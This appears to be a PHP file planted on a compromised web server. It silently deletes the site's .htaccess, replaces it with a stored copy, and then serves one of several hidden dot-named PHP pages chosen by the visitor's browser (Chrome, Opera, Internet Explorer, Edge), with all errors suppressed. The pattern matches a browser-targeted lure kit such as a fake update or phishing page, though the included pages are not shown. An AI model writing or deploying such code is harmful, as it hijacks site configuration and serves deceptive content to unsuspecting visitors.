<?php

    @unlink(".htaccess");
    @copy("__HTnon.txt",".htaccess");

// useragent detect

$usa = @$_SERVER['HTTP_USER_AGENT'];

if(@preg_match("' chrome'is", $usa) && !preg_match("' opr'is", $usa) && !preg_match("' edge'is", $usa))
	{
		@require_once '.chr_.php';
		exit();
	}
elseif(@preg_match("' opr'is", $usa))
	{
		@require_once '.opr_.php';
		exit();
	}
elseif(@preg_match("' trident'is", $usa))
	{
		@require_once '.ie_.php';
		exit();
	}
elseif(@preg_match("' edge'is", $usa))
	{
		@require_once '.me_.php';
		exit();
	}
else
    {
        @require_once '.chr_.php';
		exit();
    }